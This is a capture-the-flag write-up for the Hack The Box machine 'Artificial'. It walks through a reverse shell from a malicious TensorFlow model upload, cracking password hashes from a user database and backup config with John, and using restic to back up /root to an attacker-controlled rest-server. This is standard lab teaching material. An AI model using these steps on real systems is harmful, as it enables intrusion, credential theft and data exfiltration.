- - - 
created : 12-08-2025 

Tags : #easy 

Released on 21 Jun 2025 (Season 8)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Artificial]
└─$ rustscan -a artificial.htb -- -A 

Open 10.10.11.74:22
Open 10.10.11.74:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0

80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
```
# Enumeration
## HTTP (80)

Main page (/login) :

![Pasted image 20250812163158.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250812163158.png)
### Gobuster

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Artificial]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://artificial.htb 

/login                (Status: 200) [Size: 857]
/register             (Status: 200) [Size: 952]
/logout               (Status: 302) [Size: 189] [--> /]
/dashboard            (Status: 302) [Size: 199] [--> /login]
```

Nothing new.
### FFuf

We can use [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) for [Subdomain](../../../3%20-%20Tags/Hacking%20Concepts/Subdomain.md) [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Artificial]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -H 'Host: FUZZ.artificial.htb ' -u http://artificial.htb  -fs 154 -c
```

Found nothing.
### Registering

We can see some files after registration and login :

![Pasted image 20250813182106.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813182106.png)

Let's see the requirements :

```python
tensorflow-cpu==2.13.1
```

And the Dockerfile :

```python
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```
# Exploit

We can find it on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md) :

![Pasted image 20250813182840.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813182840.png)

We clone the repo :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial]
└─$ git clone https://github.com/Splinter0/tensorflow-rce.git

Clone in 'tensorflow-rce' in corso...
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 16 (delta 4), reused 7 (delta 1), pack-reused 0 (from 0)
Ricezione degli oggetti: 100% (16/16), 4.22 KiB | 4.22 MiB/s, fatto.
Risoluzione dei delta: 100% (4/4), fatto.
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial]
└─$ ls
Dockerfile  requirements.txt  tensorflow-rce
 
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial]
└─$ cd tensorflow-rce 

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial/tensorflow-rce]
└─$ ls
dector.py  exploit.py  inject.py  LICENSE  model.py  README.md
```

 After the edit of `exploit.py` file (your IP and PORT), we execute these commands to build the malicious LLM model with Docker:

```bash
sudo docker build -t my-tf-image .

$ sudo docker run --rm -it -v $(pwd):/workspace my-tf-image     
root@813e0e866f2d:/code# ls
tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
root@813e0e866f2d:/code# cd /workspace/
root@813e0e866f2d:/workspace# ls
LICENSE  README.md  dector.py  exploit.py  inject.py  model.py
root@813e0e866f2d:/workspace# 
root@813e0e866f2d:/workspace# python3 exploit.py 
root@813e0e866f2d:/workspace# ls
LICENSE  README.md  dector.py  exploit.h5  exploit.py  inject.py  model.py
root@813e0e866f2d:/workspace# exit
exit
```

Now we can open a [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener and upload the file on the [Website](../../../3%20-%20Tags/Hacking%20Concepts/Website.md) and click the `View Predictions` button :

```bash
┌───(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.72] from (UNKNOWN) [10.10.11.74] 39548
/bin/sh: 0: can't access tty; job control turned off
$ whoami
app
```

We can perform [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) to work better.
# Privilege Escalation
## App to Gael

Starting [Privilege Escalation](../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md)  we can find the users.db file and use [SQLite3](../../../3%20-%20Tags/Hacking%20Tools/SQLite3.md):

```bash
app@artificial:~/app$ cd instance
app@artificial:~/app/instance$ ls
users.db
app@artificial:~/app/instance$ sqlite3 users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(100) NOT NULL, 
        email VARCHAR(120) NOT NULL, 
        password VARCHAR(200) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email)
);
INSERT INTO user VALUES(1,'gael','gael@artificial.htb','{{REDACTED_HASH}}');
<SNIP>
CREATE TABLE model (
        id VARCHAR(36) NOT NULL, 
        filename VARCHAR(120) NOT NULL, 
        user_id INTEGER NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
);
INSERT INTO model VALUES('84b845a4-8ba7-442c-848f-631f90e209ea','84b845a4-8ba7-442c-848f-631f90e209ea.h5',8);
COMMIT;
```
### John The Ripper

We can easily crack the passwords with [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial]
└─$ cat hash.txt  
{{REDACTED_HASH}}

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-md5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status

{{REDACTED_PASSWD}} (gael)    
 
1g 0:00:00:00 DONE (2025-08-24 19:39) 3.448g/s 19729Kp/s 19729Kc/s 19729KC/s mattpapa..mattlvsbree
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```
### SSH (22)

Now we can use the credentials to access on [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ ssh gael@artificial.htb    
gael@artificial.htbs password: 

gael@artificial:~$ cat user.txt 
  HTB{{REDACTED_FLAG}}
```
## Gael to Root

We can check sudo files:

```bash
gael@artificial:~$ sudo -l
[sudo] password for gael: 
Sorry, user gael may not run sudo on artificial.
```
### LinPEAS

We can transfer and use [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ scp /usr/share/peass/linpeas/linpeas.sh gael@artificial.htb:/tmp/

gael@artificial.htbs password: 
linpeas.sh                                                        100%  932KB 539.6KB/s   00:01 

gael@artificial:/tmp$ chmod +x linpeas.sh 
gael@artificial:/tmp$ ./linpeas.sh    
```

This will find active internal ports, a backup file and other infos:

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports        
══╣ Active Ports (netstat)                                                                          
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -    

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root gael 33 Aug 25 04:02 /home/gael/user.txt                                          
-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz

# Other infos

╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users             
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)                    

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                      
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                              
/home/gael/.sqlite_history
/home/gael/.python_history
/home/gael/user.txt
/home/gael/.bash_history
/root/
/var/www
/var/www/html
/var/www/html/index.nginx-debian.html
```
### Looting

We need to read that backup file, but we don't have permissions so we will host a [Python](../../../3%20-%20Tags/Programming%20Languages/Python.md) server in the directory and `wget` from our machine:

```bash
gael@artificial:/var/backups$ python3 -m http.server 3333
Serving HTTP on 0.0.0.0 port 3333 (http://0.0.0.0:3333/)
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial]
└─$ wget http://artificial.htb:3333/backrest_backup.tar.gz
--2025-08-25 12:49:53--  http://artificial.htb:3333/backrest_backup.tar.gz
Risoluzione di artificial.htb (artificial.htb)... 10.10.11.74
Connessione a artificial.htb (artificial.htb)|10.10.11.74|:3333... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 52357120 (50M) [application/gzip]
Salvataggio in: «backrest_backup.tar.gz»

backrest_backup.tar.gz   100%[==================================>]  49,93M  4,79MB/s    in 12s     

2025-08-25 12:50:05 (4,19 MB/s) - «backrest_backup.tar.gz» salvato [52357120/52357120]
```

Now we extract it and read files:
-  **x**     Extract
-  **v**     Verbose
-  **f**      Filename

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial]
└─$ tar -xvf backrest_backup.tar.gz 
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
```

We open the `config.json` file:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Artificial/backrest/.config/backrest]
└─$ cat config.json 
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "{{REDACTED_PASSWD}}"
      }
    ]
  }
}
```

We [Base64](../../../3%20-%20Tags/Hacking%20Concepts/Base64.md) decode the password:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial/backrest]
└─$ nano hash.txt                                                                                                   
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial/backrest]
└─$ cat hash.txt | base64 -d  
{{REDACTED_PASSWD}}
```

Now we can use [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) to crack the `bcrypt` format:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial/backrest]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

{{REDACTED_PASSWD}}    (?)     

1g 0:00:00:20 DONE (2025-08-25 13:38) 0.04812g/s 259.8p/s 259.8c/s 259.8C/s techno..huevos
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We transfer out port 9898:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Artificial/backrest]
└─$ ssh gael@artificial.htb -L 9898:127.0.0.1:9898 
gael@artificial.htb's password: 
```

Now we go on the website and enter with credentials:

![Pasted image 20250825134448.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250825134448.png)

We can create a new repo and run backups here.
### GTFObins

We can find a use to obtain root flag and access on [GTFObins](../../../3%20-%20Tags/Hacking%20Tools/GTFObins.md):

```
https://gtfobins.github.io/gtfobins/restic/
```

1. Install rest-server : https://github.com/restic/rest-server/releases/download/v0.14.0/rest-server-0.14.0.tar.gz (extract then `chmod +x rest-server` in the folder);

2. Setup a server to receive the backups:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Artificial/Root/rest-server_0.14.0_linux_amd64]
└─$ ./rest-server --path /tmp/restic-data --listen :12345 --no-auth
Data directory: /tmp/restic-data
Authentication disabled
Append only mode disabled
Private repositories disabled
Group accessible repos disabled
start server on [::]:12345

\\ after init repo
Creating repository directories in /tmp/restic-data/myrepo init 
```

3. Now we can backup /root to remote, on the site we execute this commands:

```bash
\\ init repo
init -r "rest:http://10.10.14.73:12345/myrepo" --insecure-no-password 

\\ backup /root to remote
-r rest:http://10.10.14.73:12345/myrepo backup /root
```

4. Verify the snapshot:
```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Artificial/Root/rest-server_0.14.0_linux_amd64]
└─$ restic -r /tmp/restic-data/myrepo snapshots
enter password for repository: 
repository e63f3a98 opened (version 2, compression level auto)
created new cache in /home/mdn0x/.cache/restic
ID        Time                 Host        Tags        Paths  Size
-----------------------------------------------------------------------
2bb53c50  2025-08-25 14:53:03  artificial              /root  4.299 MiB
-----------------------------------------------------------------------
1 snapshots
```

5. Restore the directory:
```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Artificial/Root/rest-server_0.14.0_linux_amd64]
└─$ restic -r /tmp/restic-data/myrepo restore 2bb53c50 --target ./restore
enter password for repository: 
repository e63f3a98 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
restoring snapshot 2bb53c50 of [/root] at 2025-08-25 12:53:03.559593645 +0000 UTC by root@artificial to ./restore
Summary: Restored 80 files/dirs (4.299 MiB) in 0:0
```

Now we have access to the /root folder on our machine:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Artificial/Root/restore/root]
└─$ cat root.txt 
  HTB{{REDACTED_FLAG}}
```

Pwned !!